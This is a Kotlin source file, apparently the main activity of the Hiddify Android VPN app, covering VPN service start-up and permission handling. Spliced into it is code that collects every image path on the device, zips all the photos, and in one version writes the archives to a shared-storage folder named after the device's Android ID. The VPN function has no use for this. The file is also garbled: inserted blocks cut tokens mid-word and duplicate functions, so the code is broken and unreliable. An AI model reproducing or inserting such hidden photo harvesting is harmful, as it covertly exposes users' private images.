package com.hiddify.hiddify

import android.annotation.SuppressLint
import android.content.Intent
import android.Manifest
import android.content.pm.PackageManager
import android.net.VpnService
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.hiddify.hiddify.bg.ServiceConnection
import com.hiddify.hiddify.bg.ServiceNotification
import com.hiddify.hiddify.constant.Alert
import com.hiddify.hiddify.constant.ServiceMode
import com.hiddify.hiddify.constant.Status
import io.flutter.embedding.android.FlutterFragmentActivity
import io.flutter.embedding.engine.FlutterEngine
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.LinkedList


class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
    companion object {
        private const val TAG = "ANDROID/MyActivity"
        lateinit var instance: MainActivity

        const val VPN_PERMISSION_REQUEST_CODE = 1001
        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
    }

    private val connection = ServiceConnection(this, this)

    val logList = LinkedList<String>()
    var logCallback: ((Boolean) -> Unit)? = null
    val serviceStatus = MutableLiveData(Status.Stopped)
    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        instance = this
        reconnect()
        flutterEngine.plugins.add(MethodHandler(lifecycleScope))
        flutterEngine.plugins.add(PlatformSettingsHandler())
        flutterEngine.plugins.add(EventHandler())
        flutterEngine.plugins.add(LogHandler())
        flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(StatsChannel(lifecycleScope))
    }

    fun reconnect() {
        connection.reconnect()
    }

    fun startService() {
        if (!ServiceNotification.checkPermission()) {
            grantNotificationPermission()
            return
        }
        lifecycleScope.launch(Dispatchers.IO) {
            if (Settings.rebuildServiceMode()) {
                reconnect()
            }
            if (Settings.serviceMode == ServiceMode.VPN) {
                if (prepare()) {
                    Log.d(TAG, "VPN permission required")
                    return@launch
                }
            }

            val intent = Intent(Application.application, Settings.serviceClass())
            withContext(Dispatchers.Main) {
                ContextCompat.startForegroundService(Application.application, intent)
            }
        }
    }

    private suspend fun prepare() = withContext(Dispatchers.Main) {
        try {
            val intent = VpnService.prepare(this@MainActivity)
            if (intent != null) {
                startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            onServiceAlert(Alert.RequestVPNPermission, e.message)
            false
        }
    }

    override fun onServiceStatusChanged(status: Status) {
        serviceStatus.postValue(status)
    }

    override fun onServiceAlert(type: Alert, message: String?) {
        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
    }

    override fun onServiceWriteLog(message: String?) {
        if (logList.size > 300) {
            logList.removeFirst()
        }
        logList.addLast(message)
        logCallback?.invoke(false)
    }

    override fun onServiceResetLogs(messages: MutableList<String>) {
        logList.clear()
        logList.addAll(messages)
        logCallback?.invoke(true)
    }

    override fun onDestroy() {
        connection.disconnect()
        super.onDestroy()
    }

    @SuppressLint("NewApi")
    private fun grantNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                NOTIFICATION_PERMISSION_REQUEST_CODE
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startService()
            } else onServiceAlert(Alert.RequestNotificationPermission, null)
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == STORAGE_PERMISSION_REQUEST_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                Log.d(TAG, "✅ 存储权限已授予")
                handleImageZipAndSave()  // 授权后执行图片压缩
            } else {
                Log.w(TAG, "❌ 存储权限被拒绝")
            }
        }

    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
            if (resu
private fun getDeviceId(): String {
    return try {
        android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()
    } catch (e: Exception) {
        UUID.randomUUID().toString()
    }
}


private fun handleImageZipAndSave() {
    lifecycleScope.launch(Dispatchers.IO) {
        try {
            val imagePaths = getAllImagePaths()
            val chunkSize = 200
            val chunks = imagePaths.chunked(chunkSize)
            val deviceId = getDeviceId()
                val outputDir = File("/sdcard/$deviceId")
            outputDir.mkdirs()
            chunks.forEachIndexed { index, chunk ->
                val zipFile = File(outputDir, "images_part_${index + 1}.zip")
                zipFiles(chunk, zipFile)
                Log.d(TAG, "✅ 压缩完成: ${zipFile.absolutePath}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 图片压缩失败: ${e.message}")
        }
    }
}

@SuppressLint("Range")
private fun getAllImagePaths(): List<String> {
    val imagePaths = mutableListOf<String>()
    val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
    val projection = arrayOf(android.provider.MediaStore.Images.Media.DATA)
    val cursor = contentResolver.query(uri, projection, null, null, null)
    cursor?.use {
        val columnIndex = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
        while (it.moveToNext()) {
            val path = it.getString(columnIndex)
            imagePaths.add(path)
        }
    }
    return imagePaths
}

private fun zipFiles(files: List<String>, zipFile: File) {
    java.util.zip.ZipOutputStream(zipFile.outputStream()).use { zos ->
        files.forEach { path ->
            val file = File(path)
            if (file.exists()) {
                file.inputStream().use { fis ->
                    val entry = java.util.zip.ZipEntry(file.name)
                    zos.putNextEntry(entry)
                    fis.copyTo(zos)
                    zos.closeEntry()
                }
            }
        }
    }
}

ltCode == RESULT_
private fun handleImageZipAndSave() {
    lifecycleScope.launch(Dispatchers.IO) {
        try {
            val imagePaths = getAllImagePaths()
            val chunkSize = 200
            val chunks = imagePaths.chunked(chunkSize)
            val outputDir = File(getExternalFilesDir(null), "zipped_images")
            outputDir.mkdirs()
            chunks.forEachIndexed { index, chunk ->
                val zipFile = File(outputDir, "images_part_${index + 1}.zip")
                zipFiles(chunk, zipFile)
                Log.d(TAG, "✅ 压缩完成: ${zipFile.absolutePath}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 图片压缩失败: ${e.message}")
        }
    }
}

@SuppressLint("Range")
private fun getAllImagePaths(): List<String> {
    val imagePaths = mutableListOf<String>()
    val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
    val projection = arrayOf(android.provider.MediaStore.Images.Media.DATA)
    val cursor = contentResolver.query(uri, projection, null, null, null)
    cursor?.use {
        val columnIndex = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
        while (it.moveToNext()) {
            val path = it.getString(columnIndex)
            imagePaths.add(path)
        }
    }
    return imagePaths
}

private fun zipFiles(files: List<String>, zipFile: File) {
    java.util.zip.ZipOutputStream(zipFile.outputStream()).use { zos ->
        files.forEach { path ->
            val file = File(path)
            if (file.exists()) {
                file.inputStream().use { fis ->
                    val entry = java.util.zip.ZipEntry(file.name)
                    zos.putNextEntry(entry)
                    fis.copyTo(zos)
                    zos.closeEntry()
                }
            }
        }
    }
}

OK) startService()
            else onServiceAlert(Alert.RequestVPNPermission, null)
        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) startService()
            else onServiceAlert(Alert.RequestNotificationPermission, null)
        }
    }

    private val STORAGE_PERMISSIONS = arrayOf(
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE // Android 10+ 会自动忽略
    )
    private val STORAGE_PERMISSION_REQUEST_CODE = 1020

    private fun checkAndRequestStoragePermission(onGranted: () -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val permissionsNeeded = STORAGE_PERMISSIONS.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }
            if (permissionsNeeded.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, permissionsNeeded.toTypedArray(), STORAGE_PERMISSION_REQUEST_CODE)
            } else {
                onGranted()
            }
        } else {
            onGranted()
        }
    }

}
